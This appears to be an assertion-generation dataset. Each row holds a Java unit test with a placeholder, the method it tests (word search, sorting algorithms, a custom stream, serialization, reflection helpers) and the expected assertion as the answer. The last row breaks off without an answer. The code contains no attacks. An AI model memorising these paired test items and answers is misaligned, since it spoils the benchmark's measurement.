"exist_startNotFromLeftRightCorner_multipleWrongPaths() { char[][] board = new char[][]{ {'A', 'B', 'C', 'E'}, {'S', 'F', 'C', 'S'}, {'A', 'D', 'E', 'E'} }; var word = ""SEE"";  ""<AssertPlaceHolder>""; }
exist(char[][] board, String word) { var m = board.length; var n = board[0].length;  for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (checkIsCharacterSuitable(board, i, j, word, 0)) { boolean[][] visited = new boolean[m][n]; visited[i][j] = true;  if (findNextCharacter(board, i, j, word, 1, visited)) { return true; } } } } return false; }"	assertTrue(wordSearch.exist(board, word))
"exist_preventCharsReUsage() { char[][] board = new char[][]{ {'A', 'B', 'C', 'E'}, {'S', 'F', 'C', 'S'}, {'A', 'D', 'E', 'E'} }; var word = ""ABCB"";  ""<AssertPlaceHolder>""; }
exist(char[][] board, String word) { var m = board.length; var n = board[0].length;  for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (checkIsCharacterSuitable(board, i, j, word, 0)) { boolean[][] visited = new boolean[m][n]; visited[i][j] = true;  if (findNextCharacter(board, i, j, word, 1, visited)) { return true; } } } } return false; }"	assertFalse(wordSearch.exist(board, word))
"exist_checkConnectivity() { char[][] board = new char[][]{ {'A', 'B', 'C', 'E'}, {'S', 'F', 'C', 'S'}, {'A', 'D', 'E', 'E'} }; var word = ""ABCD"";  ""<AssertPlaceHolder>""; }
exist(char[][] board, String word) { var m = board.length; var n = board[0].length;  for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (checkIsCharacterSuitable(board, i, j, word, 0)) { boolean[][] visited = new boolean[m][n]; visited[i][j] = true;  if (findNextCharacter(board, i, j, word, 1, visited)) { return true; } } } } return false; }"	assertFalse(wordSearch.exist(board, word))
"exist_allCharsUsed() { char[][] board = new char[][]{ {'A', 'B', 'C', 'E'}, {'S', 'F', 'C', 'S'}, {'A', 'D', 'E', 'E'} }; var word = ""ASABFDECCESE"";  ""<AssertPlaceHolder>""; }
exist(char[][] board, String word) { var m = board.length; var n = board[0].length;  for (int i = 0; i < m; i++) { for (int j = 0; j < n; j++) { if (checkIsCharacterSuitable(board, i, j, word, 0)) { boolean[][] visited = new boolean[m][n]; visited[i][j] = true;  if (findNextCharacter(board, i, j, word, 1, visited)) { return true; } } } } return false; }"	assertTrue(wordSearch.exist(board, word))
"testSerializeDeserialize() { ExternalizeUtil.write(SERIALIZED_FILE_NAME, buildUserInfo()); var deserializedObject = ExternalizeUtil.read(SERIALIZED_FILE_NAME);  ""<AssertPlaceHolder>""; }
read(String fileName) { try (var objectInputStream = new ObjectInputStream(new FileInputStream(fileName))) { return objectInputStream.readObject(); } }"	assertThat(deserializedObject).isEqualTo(buildUserInfo())
"process() { int[] ages = new int[] { 5, 7, 8, 57, 56, 42, 7, 90, 7, 5, 57}; Map<Integer, Long> expectedResult = new HashMap() {{ put(5, 2L); put(7, 3L); put(8, 1L); put(42, 1L); put(56, 1L); put(57, 2L); put(90, 1L); }};  Map<Integer, Long> result = ArrayOfAges.process(ages);  System.out.println(result); ""<AssertPlaceHolder>""; }
process(int[] ages) { long[] buckets = new long[130]; for (var age : ages) { buckets[age]++; }  Map<Integer, Long> map = new LinkedHashMap<>(); for (var age = 0; age < buckets.length; age++) { if (buckets[age] > 0) { map.put(age, buckets[age]); } } return map; }"	assertThat(result).isEqualTo(expectedResult)
"applyForEmpty() { Integer[] array = {};  BubbleSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { var sorted = false; while (!sorted) { sorted = true;  for (var i = 1; i < array.length; i++) { if (array[i].compareTo(array[i - 1]) < 0) { swap(array, i, i - 1); sorted = false; } } } }"	assertThat(array).isEqualTo(new Integer[]{})
"apply() { Integer[] array = {1, 4, 6, 8, 9, -2, 5};  BubbleSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { var sorted = false; while (!sorted) { sorted = true;  for (var i = 1; i < array.length; i++) { if (array[i].compareTo(array[i - 1]) < 0) { swap(array, i, i - 1); sorted = false; } } } }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 8, 9})
"apply2ForEmpty() { Integer[] array = {};  BubbleSort.apply2(array);  ""<AssertPlaceHolder>""; }
apply2(T[] array) { for (var outIndex = array.length - 1; outIndex > 0; outIndex--) { for (var inIndex = 0; inIndex < outIndex; inIndex++) { if (array[inIndex].compareTo(array[inIndex + 1]) > 0) { swap(array, inIndex, inIndex + 1); } } } }"	assertThat(array).isEqualTo(new Integer[]{})
"apply2() { Integer[] array = {1, 4, 6, 8, 9, -2, 5};  BubbleSort.apply2(array);  ""<AssertPlaceHolder>""; }
apply2(T[] array) { for (var outIndex = array.length - 1; outIndex > 0; outIndex--) { for (var inIndex = 0; inIndex < outIndex; inIndex++) { if (array[inIndex].compareTo(array[inIndex + 1]) > 0) { swap(array, inIndex, inIndex + 1); } } } }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 8, 9})
"applyForEmpty() { Integer[] array = {};  BucketSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { // Prepare empty buckets List<List<Comparable>> buckets = new ArrayList<>(BUCKETS_COUNT); for (int i = 0; i < BUCKETS_COUNT; i++) { buckets.add(new ArrayList<>()); }  // Fill in buckets for (int i = 0; i < items.length; i++) { var bucketIndex = determineBucketIndex(items[i], BUCKETS_COUNT); buckets.get(bucketIndex).add(items[i]); }  int currIndex = 0; for (int bucketIndex = 0; bucketIndex < BUCKETS_COUNT; bucketIndex++) { List<Comparable> bucket = buckets.get(bucketIndex);  // Sort elements in each bucket Comparable[] array = bucket.toArray(new Comparable[0]); InsertionSort.apply(array);  // Populate the result array with values from bucket for (var item : array) { items[currIndex] = (T) item; currIndex++; } } }"	assertThat(array).isEqualTo(new Integer[]{})
"applyForInt() { Integer[] array = {4, 1, 6, 9, -2, 8, 5};  BucketSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { // Prepare empty buckets List<List<Comparable>> buckets = new ArrayList<>(BUCKETS_COUNT); for (int i = 0; i < BUCKETS_COUNT; i++) { buckets.add(new ArrayList<>()); }  // Fill in buckets for (int i = 0; i < items.length; i++) { var bucketIndex = determineBucketIndex(items[i], BUCKETS_COUNT); buckets.get(bucketIndex).add(items[i]); }  int currIndex = 0; for (int bucketIndex = 0; bucketIndex < BUCKETS_COUNT; bucketIndex++) { List<Comparable> bucket = buckets.get(bucketIndex);  // Sort elements in each bucket Comparable[] array = bucket.toArray(new Comparable[0]); InsertionSort.apply(array);  // Populate the result array with values from bucket for (var item : array) { items[currIndex] = (T) item; currIndex++; } } }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 8, 9})
"applyForDouble() { Double[] array = {21.3, 2.3, -3.4, 43.7, 4.5, -23.1, 5.2};  BucketSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { // Prepare empty buckets List<List<Comparable>> buckets = new ArrayList<>(BUCKETS_COUNT); for (int i = 0; i < BUCKETS_COUNT; i++) { buckets.add(new ArrayList<>()); }  // Fill in buckets for (int i = 0; i < items.length; i++) { var bucketIndex = determineBucketIndex(items[i], BUCKETS_COUNT); buckets.get(bucketIndex).add(items[i]); }  int currIndex = 0; for (int bucketIndex = 0; bucketIndex < BUCKETS_COUNT; bucketIndex++) { List<Comparable> bucket = buckets.get(bucketIndex);  // Sort elements in each bucket Comparable[] array = bucket.toArray(new Comparable[0]); InsertionSort.apply(array);  // Populate the result array with values from bucket for (var item : array) { items[currIndex] = (T) item; currIndex++; } } }"	assertThat(array).isEqualTo(new Double[]{-23.1, -3.4, 2.3, 4.5, 5.2, 21.3, 43.7})
"applyForEmpty() { Integer[] array = {};  HeapSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { var n = items.length;  // Build heap (rearrange array) for (var i = n / 2 - 1; i >= 0; i--) { heapify(items, n, i); }  // One by one extract an element from heap for (var i = n - 1; i > 0; i--) { // Move current root to the end swap(items, 0, i);  // Call max heapify on the reduced heap heapify(items, i, 0); } }"	assertThat(array).isEqualTo(new Integer[]{})
"apply() { Integer[] array = {1, 4, 8, 6, 9, -2, 5};  HeapSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { var n = items.length;  // Build heap (rearrange array) for (var i = n / 2 - 1; i >= 0; i--) { heapify(items, n, i); }  // One by one extract an element from heap for (var i = n - 1; i > 0; i--) { // Move current root to the end swap(items, 0, i);  // Call max heapify on the reduced heap heapify(items, i, 0); } }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 8, 9})
"applyForString() { String[] array = {""Юлия"", ""Андрей"", ""Елена"", ""Павел"", ""Тихон""};  HeapSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { var n = items.length;  // Build heap (rearrange array) for (var i = n / 2 - 1; i >= 0; i--) { heapify(items, n, i); }  // One by one extract an element from heap for (var i = n - 1; i > 0; i--) { // Move current root to the end swap(items, 0, i);  // Call max heapify on the reduced heap heapify(items, i, 0); } }"	"assertThat(array).isEqualTo(new String[]{""Андрей"", ""Елена"", ""Павел"", ""Тихон"", ""Юлия""})"
"applyForEmpty() { Integer[] array = {};  InsertionSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { for (int i = 1; i < array.length; i++) { var x = array[i];  // Вставить x в правильную позицию среди array[0]...array[i-1] var j = i; while (j > 0 && x.compareTo(array[j - 1]) < 0) { array[j] = array[j - 1]; j--; } array[j] = x; } }"	assertThat(array).isEqualTo(new Integer[]{})
"apply() { Integer[] array = {1, 4, 8, 6, 9, -2, 5};  InsertionSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { for (int i = 1; i < array.length; i++) { var x = array[i];  // Вставить x в правильную позицию среди array[0]...array[i-1] var j = i; while (j > 0 && x.compareTo(array[j - 1]) < 0) { array[j] = array[j - 1]; j--; } array[j] = x; } }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 8, 9})
"applyForEmpty() { Integer[] array = {};  MergeSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { int n = items.length; if (n < 2) { return; } int mid = n / 2;  var left = Arrays.copyOfRange(items, 0, mid); var right = Arrays.copyOfRange(items, mid, n);  apply(left); apply(right);  merge(items, left, right); }"	assertThat(array).isEqualTo(new Integer[]{})
"applyForInt() { Integer[] array = {4, 1, 6, 9, -2, 8, 5};  MergeSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { int n = items.length; if (n < 2) { return; } int mid = n / 2;  var left = Arrays.copyOfRange(items, 0, mid); var right = Arrays.copyOfRange(items, mid, n);  apply(left); apply(right);  merge(items, left, right); }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 8, 9})
"applyForString() { String[] array = {""Юлия"", ""Андрей"", ""Елена"", ""Павел"", ""Тихон""};  MergeSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { int n = items.length; if (n < 2) { return; } int mid = n / 2;  var left = Arrays.copyOfRange(items, 0, mid); var right = Arrays.copyOfRange(items, mid, n);  apply(left); apply(right);  merge(items, left, right); }"	"assertThat(array).isEqualTo(new String[]{""Андрей"", ""Елена"", ""Павел"", ""Тихон"", ""Юлия""})"
"applyForEmpty() { Integer[] array = {};  QuickSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { quickSort(items, 0, items.length - 1); }"	assertThat(array).isEqualTo(new Integer[]{})
"applyForInt() { Integer[] array = {4, 1, 6, 9, -2, 8, 5};  QuickSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { quickSort(items, 0, items.length - 1); }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 8, 9})
"applyForString() { String[] array = {""Юлия"", ""Андрей"", ""Елена"", ""Павел"", ""Тихон""};  QuickSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] items) { quickSort(items, 0, items.length - 1); }"	"assertThat(array).isEqualTo(new String[]{""Андрей"", ""Елена"", ""Павел"", ""Тихон"", ""Юлия""})"
"applyForEmpty() { Integer[] array = {};  SelectionSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { for (int i = 0; i < array.length; i++) { int minIndex = i;  for (int j = i + 1; j < array.length; j++) { if (lessThan(array[j], array[minIndex])) minIndex = j; }  swap(array, i, minIndex); } }"	assertThat(array).isEqualTo(new Integer[]{})
"apply() { Integer[] array = {1, 4, 8, 6, 9, -2, 5};  SelectionSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { for (int i = 0; i < array.length; i++) { int minIndex = i;  for (int j = i + 1; j < array.length; j++) { if (lessThan(array[j], array[minIndex])) minIndex = j; }  swap(array, i, minIndex); } }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 8, 9})
"applyForEmpty() { Integer[] array = {};  ShellSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { int d = 1;  while (d <= array.length / 3) { d = d * 3 + 1;      // (1, 4, 13, 40, 121, ...) }  while (d > 0) { for (int outer = d; outer < array.length; outer++) { var tmp = array[outer]; int inner = outer;  while (inner - d >= 0 && greaterThan(array[inner - d], tmp)) { array[inner] = array[inner - d]; inner -= d; } array[inner] = tmp; }  d = (d - 1) / 3; } }"	assertThat(array).isEqualTo(new Integer[]{})
"applyForInt() { Integer[] array = {4, 1, 6, 9, -2, 6, 8, 5};  ShellSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { int d = 1;  while (d <= array.length / 3) { d = d * 3 + 1;      // (1, 4, 13, 40, 121, ...) }  while (d > 0) { for (int outer = d; outer < array.length; outer++) { var tmp = array[outer]; int inner = outer;  while (inner - d >= 0 && greaterThan(array[inner - d], tmp)) { array[inner] = array[inner - d]; inner -= d; } array[inner] = tmp; }  d = (d - 1) / 3; } }"	assertThat(array).isEqualTo(new Integer[]{-2, 1, 4, 5, 6, 6, 8, 9})
"applyForString() { String[] array = {""Юлия"", ""Андрей"", ""Елена"", ""Павел"", ""Тихон""};  ShellSort.apply(array);  ""<AssertPlaceHolder>""; }
apply(T[] array) { int d = 1;  while (d <= array.length / 3) { d = d * 3 + 1;      // (1, 4, 13, 40, 121, ...) }  while (d > 0) { for (int outer = d; outer < array.length; outer++) { var tmp = array[outer]; int inner = outer;  while (inner - d >= 0 && greaterThan(array[inner - d], tmp)) { array[inner] = array[inner - d]; inner -= d; } array[inner] = tmp; }  d = (d - 1) / 3; } }"	"assertThat(array).isEqualTo(new String[]{""Андрей"", ""Елена"", ""Павел"", ""Тихон"", ""Юлия""})"
"testEmpty() { List result = CustomStream.empty() .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of())
"testOfForSingle() { List result = CustomStream.of(new Item(56, 78)) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo( List.of(new Item(56, 78)) )
"testOfForMultiple() { List result = CustomStream.of(new Item(56, 78), new Item(57, 79)) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of( new Item(56, 78), new Item(57, 79) ))
"testOfNullableForNull() { List<Object> result = CustomStream .ofNullable(null) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of())
"testOfNullable() { List<Item> result = CustomStream .ofNullable(new Item(56, 78)) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of(new Item(56, 78)))
"testFilter() { List<Item> list = buildList();  List result = new CustomStream<>(list) .filter(item -> item.getY() > 10) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of( new Item(2, 18), new Item(5, 11) ))
"testMap() { List<Item> list = buildList();  List result = new CustomStream<>(list) .map(Item::getX) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of(1, 2, 5))
"testFilterAndMap() { List<Item> list = buildList();  List result = new CustomStream<>(list) .filter(item -> item.getY() > 10) .map(Item::getX) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of(2, 5))
"testSkip() { List<Item> list = buildList();  List<Item> result = new CustomStream<>(list) .skip(2) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of(new Item(5, 11)))
"testSkipAll() { List<Item> list = buildList();  List<Item> result = new CustomStream<>(list) .skip(4) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result.isEmpty()).isEqualTo(true)
"testDropWhile() { List<Item> list = buildList();  List<Item> result = new CustomStream<>(list) .dropWhile(item -> item.getX() < 5) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of(new Item(5, 11)))
"testLimit() { List<Item> list = buildList();  List<Item> result = new CustomStream<>(list) .limit(2) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of(new Item(1, 3), new Item(2, 18)))
"testTakeWhile() { List<Item> list = buildList();  List<Item> result = new CustomStream<>(list) .takeWhile(item -> item.getX() < 4) .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo(List.of(new Item(1, 3), new Item(2, 18)))
"testCount() { List<Item> list = buildList();  int result = new CustomStream<>(list) .count();  ""<AssertPlaceHolder>""; }
count() { for (var action : actions) { action.apply(this); } return list.size(); }"	assertThat(result).isEqualTo(3)
"testDistinct() { List<Item> list = buildList(); list.addAll(buildList());  var result = new CustomStream<>(list) .distinct() .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo( List.of(new Item(1, 3), new Item(2, 18), new Item(5, 11)) )
"testDistinctWhenNullsPresent() { List<Item> list = buildList(); list.add(null); list.addAll(buildList()); list.add(null);  var result = new CustomStream<>(list) .distinct() .collectToList();  ""<AssertPlaceHolder>""; }
collectToList() { for (var action : actions) { action.apply(this); } return list; }"	assertThat(result).isEqualTo( Arrays.asList(new Item(1, 3), new Item(2, 18), new Item(5, 11), null) )
"testToArray() { List<Item> list = buildList();  Object[] result = new CustomStream<>(list) .toArray();  ""<AssertPlaceHolder>""; }
toArray() { for (var action : actions) { action.apply(this); } return list.toArray(); }"	assertThat(result).isEqualTo(new Object[]{new Item(1, 3), new Item(2, 18), new Item(5, 11)})
"testToList() { List<Item> list = buildList();  List<Item> result = new CustomStream<>(list) .toList();  ""<AssertPlaceHolder>""; try { result.add(new Item(3, 3)); fail(""Exception should be thrown!""); } catch (UnsupportedOperationException uoe) { // Don't need to check anything } }
toList() { for (var action : actions) { action.apply(this); } return Collections.unmodifiableList(list); }"	assertThat(result).isEqualTo( Arrays.asList(new Item(1, 3), new Item(2, 18), new Item(5, 11)) )
"testForEach() { List<Item> list = buildList();  var result = new ArrayList<>(); new CustomStream<>(list) .forEach(item -> result.add(item.getX() * item.getY()));  ""<AssertPlaceHolder>""; }
forEach(Function<T, Object> function) { for (var action : actions) { action.apply(this); } for (var item : list) { function.apply(item); } }"	assertThat(result).isEqualTo(List.of(3, 36, 55))
"sorted() { List<Item> list = buildList(); list.add(new Item(4, 10)); list.add(new Item(78, 7));  List<Item> result = new CustomStream<>(list) .sorted(Comparator.comparingInt(Item::getY)) .toList();  ""<AssertPlaceHolder>""; }
toList() { for (var action : actions) { action.apply(this); } return Collections.unmodifiableList(list); }"	assertThat(result).isEqualTo(Arrays.asList( new Item(1, 3), new Item(78, 7), new Item(4, 10), new Item(5, 11), new Item(2, 18) ))
"findForNull() { ""<AssertPlaceHolder>""; }
find(String s) { if (s == null || s.length() < 3) { return List.of(); }  var result = new ArrayList<List<Integer>>(); var chars = s.toCharArray();  var start = 0; var pos = 1; while (pos < chars.length) { if (chars[pos] != chars[pos - 1]) { addNewIntervalIfPossible(result, start, pos); start = pos; } pos++; } addNewIntervalIfPossible(result, start, pos);  return result; }"	assertThat(largeGroupPositions.find(null)).isEqualTo(List.of())
"applyWhenNoSpaces() { ""<AssertPlaceHolder>""; }
apply(char[] str) { boolean spaceFound = false; int current = 0; int newEnd = 0;  while (current < str.length) { if (str[current] == ' ') { if (spaceFound) { current++; continue; }  spaceFound = true; } else { spaceFound = false; }  copy(str, current, newEnd); newEnd++;  current++; }  return Arrays.copyOfRange(str, 0, newEnd); }"	"assertThat(ReplaceConsequentSpacesWithOne.apply(""JustString"".toCharArray())) .isEqualTo(""JustString"".toCharArray())"
"applyWhenChangesNotNeeded() { ""<AssertPlaceHolder>""; }
apply(char[] str) { boolean spaceFound = false; int current = 0; int newEnd = 0;  while (current < str.length) { if (str[current] == ' ') { if (spaceFound) { current++; continue; }  spaceFound = true; } else { spaceFound = false; }  copy(str, current, newEnd); newEnd++;  current++; }  return Arrays.copyOfRange(str, 0, newEnd); }"	"assertThat(ReplaceConsequentSpacesWithOne.apply(""one space is enough"".toCharArray())) .isEqualTo(""one space is enough"".toCharArray())"
"apply() { ""<AssertPlaceHolder>""; }
apply(char[] str) { boolean spaceFound = false; int current = 0; int newEnd = 0;  while (current < str.length) { if (str[current] == ' ') { if (spaceFound) { current++; continue; }  spaceFound = true; } else { spaceFound = false; }  copy(str, current, newEnd); newEnd++;  current++; }  return Arrays.copyOfRange(str, 0, newEnd); }"	"assertThat(ReplaceConsequentSpacesWithOne.apply(""  one two  three   "".toCharArray())) .isEqualTo("" one two three "".toCharArray())"
"modifyStringForNullOrEmpty() { var items = new String[]{null, """"};  for (var item : items) { var result = instance.modifyString(item); ""<AssertPlaceHolder>""; } }
modifyString(String s) { if (StringUtils.isEmpty(s)) { return s; }  var chars = s.toCharArray(); for (int i = 0; i < chars.length; i++) { if (chars[i] == '?') { chars[i] = selectChar(chars, i); } } return new String(chars); }"	assertThat(item).isEqualTo(result)
"findEquivalentSubtreesForNull() { ""<AssertPlaceHolder>""; }
findEquivalentSubtrees(Node root) { if (root == null) { return null; }  // Build map { Node -> (Vocabulary of sub nodes)} Map<Node, Set<Character>> node2Voc = new HashMap<>(); buildNodeVocabulary(root, node2Voc);  // Build Node->nodeSize map Map<Node, Integer> node2Size = new HashMap<>(); buildNode2Size(root, node2Size);  // Build Set<Character> -> List<Node> map Map<Set<Character>, List<Node>> voc2Nodes = new HashMap<>(); node2Voc = node2Voc.entrySet().stream() //                .filter(nodeSetEntry -> !nodeSetEntry.getValue().isEmpty()) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue() ));  for (Node node : node2Voc.keySet()) { Set<Character> value = node2Voc.get(node);  if (!voc2Nodes.containsKey(value)) { voc2Nodes.put(value, new ArrayList<>()); } voc2Nodes.get(value).add(node); }  // Found equivalent nodes voc2Nodes = voc2Nodes.entrySet().stream() .filter(entry -> entry.getValue().size() >= 2) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue().stream() .sorted((o1, o2) -> node2Size.get(o2) - node2Size.get(o1)) .limit(2) .collect(Collectors.toList()) )); // Only absent sets with at least 2 related nodes remain  if (voc2Nodes.isEmpty()) { return null; }  Map<Set<Character>, List<Node>> map = voc2Nodes.entrySet().stream() .sorted((o1, o2) -> o2.getValue().stream().mapToInt(node2Size::get).sum() - o1.getValue().stream().mapToInt(node2Size::get).sum()) .limit(1) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue() ));  return (List<Node>) map.values().toArray()[0]; }"	assertThat(equivalentTrees.findEquivalentSubtrees(null), is(nullValue()))
"findEquivalentSubtreesForRootNodeOnly() { EquivalentTrees.Node node = new EquivalentTrees.Node('A'); ""<AssertPlaceHolder>""; }
findEquivalentSubtrees(Node root) { if (root == null) { return null; }  // Build map { Node -> (Vocabulary of sub nodes)} Map<Node, Set<Character>> node2Voc = new HashMap<>(); buildNodeVocabulary(root, node2Voc);  // Build Node->nodeSize map Map<Node, Integer> node2Size = new HashMap<>(); buildNode2Size(root, node2Size);  // Build Set<Character> -> List<Node> map Map<Set<Character>, List<Node>> voc2Nodes = new HashMap<>(); node2Voc = node2Voc.entrySet().stream() //                .filter(nodeSetEntry -> !nodeSetEntry.getValue().isEmpty()) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue() ));  for (Node node : node2Voc.keySet()) { Set<Character> value = node2Voc.get(node);  if (!voc2Nodes.containsKey(value)) { voc2Nodes.put(value, new ArrayList<>()); } voc2Nodes.get(value).add(node); }  // Found equivalent nodes voc2Nodes = voc2Nodes.entrySet().stream() .filter(entry -> entry.getValue().size() >= 2) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue().stream() .sorted((o1, o2) -> node2Size.get(o2) - node2Size.get(o1)) .limit(2) .collect(Collectors.toList()) )); // Only absent sets with at least 2 related nodes remain  if (voc2Nodes.isEmpty()) { return null; }  Map<Set<Character>, List<Node>> map = voc2Nodes.entrySet().stream() .sorted((o1, o2) -> o2.getValue().stream().mapToInt(node2Size::get).sum() - o1.getValue().stream().mapToInt(node2Size::get).sum()) .limit(1) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue() ));  return (List<Node>) map.values().toArray()[0]; }"	assertThat(equivalentTrees.findEquivalentSubtrees(node), is(nullValue()))
"findEquivalentSubtreesWhenNoCandidates() { EquivalentTrees.Node node = new EquivalentTrees.Node('A'); node.left = new EquivalentTrees.Node('B'); ""<AssertPlaceHolder>""; }
findEquivalentSubtrees(Node root) { if (root == null) { return null; }  // Build map { Node -> (Vocabulary of sub nodes)} Map<Node, Set<Character>> node2Voc = new HashMap<>(); buildNodeVocabulary(root, node2Voc);  // Build Node->nodeSize map Map<Node, Integer> node2Size = new HashMap<>(); buildNode2Size(root, node2Size);  // Build Set<Character> -> List<Node> map Map<Set<Character>, List<Node>> voc2Nodes = new HashMap<>(); node2Voc = node2Voc.entrySet().stream() //                .filter(nodeSetEntry -> !nodeSetEntry.getValue().isEmpty()) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue() ));  for (Node node : node2Voc.keySet()) { Set<Character> value = node2Voc.get(node);  if (!voc2Nodes.containsKey(value)) { voc2Nodes.put(value, new ArrayList<>()); } voc2Nodes.get(value).add(node); }  // Found equivalent nodes voc2Nodes = voc2Nodes.entrySet().stream() .filter(entry -> entry.getValue().size() >= 2) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue().stream() .sorted((o1, o2) -> node2Size.get(o2) - node2Size.get(o1)) .limit(2) .collect(Collectors.toList()) )); // Only absent sets with at least 2 related nodes remain  if (voc2Nodes.isEmpty()) { return null; }  Map<Set<Character>, List<Node>> map = voc2Nodes.entrySet().stream() .sorted((o1, o2) -> o2.getValue().stream().mapToInt(node2Size::get).sum() - o1.getValue().stream().mapToInt(node2Size::get).sum()) .limit(1) .collect(Collectors.toMap( entry -> entry.getKey(), entry -> entry.getValue() ));  return (List<Node>) map.values().toArray()[0]; }"	assertThat(equivalentTrees.findEquivalentSubtrees(node), is(nullValue()))
"test_getAnnByClassTree() { List<ClassFlag> parameters = ReflectUtil.getAnnotationOfInheritanceTree( FourthClass3.class, ClassFlag.class, Arrays::asList, (cur, agg) -> { if (agg == null || cur == null) { return cur; } List<ClassFlag> arrayList = new ArrayList<>(); arrayList.addAll(agg); arrayList.addAll(cur); return arrayList; }); Assert.""<AssertPlaceHolder>""; }
getAnnotationOfInheritanceTree( Type from, Class<T> targetAnnotationType, R aggregatedAnn, Function<T, R> extractFunc, BinaryOperator<R> mergeFunc) { if (from == null) { throw new IllegalArgumentException(); } Class rc = getRawType(from); R newAggregatedAnn; Annotation parameterAnn = rc.getAnnotation(targetAnnotationType); if (parameterAnn != null) { T cur = (T) parameterAnn; R extracted = extractFunc.apply(cur); newAggregatedAnn = mergeFunc.apply(extracted, aggregatedAnn); } else { newAggregatedAnn = aggregatedAnn; } Class superClass = rc.getSuperclass(); if (superClass == null) { return newAggregatedAnn; } else { return getAnnotationOfInheritanceTree(superClass, targetAnnotationType, newAggregatedAnn, extractFunc, mergeFunc); } }"	assertEquals(3, parameters.size())
"test_scanParameterizedType_2() { Map<String, Type> m = ReflectUtil.scanParameterizedType(TestSubClass1.class, CommonInterface.class); Assert.""<AssertPlaceHolder>""; }
scanParameterizedType(Type from, Class to) { Map<Type, Map<String, Type>> v = visit(from, null); return v.get(to); }"	assertNull(m)
"Exception { TestAbstractDAGVisitor visitor = new TestAbstractDAGVisitor(); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""2"", ""2"")); visitor.putEdge(new TestAbstractDAGNode(""2"", ""2""), new TestAbstractDAGNode(""3"", ""3"")); visitor.putEdge(new TestAbstractDAGNode(""1"", ""1""), new TestAbstractDAGNode(""4"", ""4"")); visitor.putEdge(new TestAbstractDAGNode(""4"", ""4""), new TestAbstractDAGNode(""3"", ""3"")); Assert.""<AssertPlaceHolder>""; }
